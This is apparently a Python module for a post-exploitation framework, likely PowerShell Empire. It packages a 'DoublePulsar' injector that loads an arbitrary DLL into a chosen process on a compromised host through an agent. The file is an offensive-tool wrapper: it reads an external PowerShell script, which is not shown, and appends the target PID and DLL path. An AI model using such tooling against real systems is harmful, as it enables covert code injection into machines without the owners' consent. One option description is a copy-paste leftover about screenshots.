from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'DoublePulsar',

            # list of one or more authors for the module
            'Author': ['Matt Hillman, Company Countercept.com, Script : Luis Vacas @ CyberVaca'],

            # more verbose multi-line description of the module
            'Description': ('DoublePulsar load an aribitrary DLL in other process.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,
            
            # The minimum PowerShell version needed for the module to run
            'MinPSVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'https://github.com/countercept/doublepulsar-usermode-injector',
		      ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to grab a screenshot from.',
                'Required'      :   True,
                'Value'         :   ''
            },
                'DLL_Path' : {
                'Description'   :   'DLL path to inject.',
                'Required'      :   True,
                'Value'         :   ''
            },
		'ProcessID' : {
                'Description'   :   'PID Process to inject',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):
        
        # the PowerShell script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.


        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "data/module_source/code_execution/doublepulsar.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
	script += "doublepulsar "
        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "credid":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        return script
